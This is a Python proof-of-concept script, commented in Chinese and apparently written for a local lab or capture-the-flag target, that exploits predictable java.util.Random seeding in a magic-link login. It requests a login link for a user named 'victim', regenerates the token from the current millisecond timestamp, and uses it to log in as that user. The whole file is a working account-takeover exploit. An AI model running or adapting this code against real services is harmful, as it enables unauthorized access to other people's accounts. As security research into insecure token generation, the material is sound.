#!/usr/bin/env python3
"""
repro_with_java_random_pkg.py
使用第三方包 java-random 来复现 Java TokenUtil.createToken 的 token。
python -m pip install --user git+https://github.com/MostAwesomeDude/java-random
"""

import base64
import time
from javarandom import Random   # 来自 MostAwesomeDude/java-random 仓库
import requests
import urllib.parse

# 源代码中的Random类实现方法，由于Random不安全，在同一个时间Random 实例在同一毫秒内被创建时，默认种子就是当前时间戳；
# 如果在极短时间内（<1 ms）连续跑两次，时间戳没变，随机序列就一模一样
CHAR_LOWER = "abcdefghijklmnopqrstuvwxyz"
NUMBERS = "1234567890"
SYMBOLS = "!@#$%^&*()"
CHARSET = CHAR_LOWER + CHAR_LOWER.upper() + NUMBERS + SYMBOLS
TOKEN_LENGTH = 42
GENERATE_PATH = "/generateMagicLink" # 触发生成 token 的路径
MAGIC_LINK_PATH = "/magicLink/{}" # 使用 token 的路径

def create_token_using_java_random_pkg(user_id: int, seed_ms: int):
    """
    使用第三方 java-random 包（实现了 java.util.Random）来生成与 Java 程序相同的 token。
    返回 (token, raw_string)
    """
    rnd = Random(seed_ms) # java.util.Random(seed_ms)
    sb_chars = []
    charset_len = len(CHARSET)
    for _ in range(TOKEN_LENGTH):
        idx = rnd.nextInt(charset_len) # 与 Java 中的 nextInt(bound) 行为一致
        sb_chars.append(CHARSET[idx])

    raw = "".join(sb_chars)
    key = user_id & 0xFF # XOR 操作
    encbytes = bytes([(b ^ key) & 0xFF for b in raw.encode("utf-8")])
    token = base64.urlsafe_b64encode(encbytes).decode("ascii").rstrip("=")
    return token, raw

def send_generate_magic_link(session: requests.Session, base_url: str, username: str):
    """
    POST /generateMagicLink 触发生成 token
    """
    url = urllib.parse.urljoin(base_url, GENERATE_PATH)
    data = {"username": username}
    resp = session.post(url, data=data, allow_redirects=False)
    return resp.status_code, resp.text

def consume_magic_link(session: requests.Session, base_url: str, token: str):
    """
    GET /magicLink/{token} 使用 token 登录
    """
    path = MAGIC_LINK_PATH.format(urllib.parse.quote(token, safe=""))
    url = urllib.parse.urljoin(base_url, path)
    resp = session.get(url, allow_redirects=False)
    return resp.status_code, resp.text

if __name__ == "__main__":
    base_url = "http://127.0.0.1:8080/"
    username = "victim"
    uid = 1234

    with requests.Session() as s:
        code, text = send_generate_magic_link(s, base_url, username)
        print("POST /generateMagicLink ->", code, text[:100])

        seed = int(time.time() * 1000)
        tok, raw = create_token_using_java_random_pkg(uid, seed)
        print("seed_ms:", seed)
        print("raw:", raw)
        print("token:", tok)
        
        code, text = consume_magic_link(s, base_url, tok)
        print("GET /magicLink/{token} ->", code, text[:100])
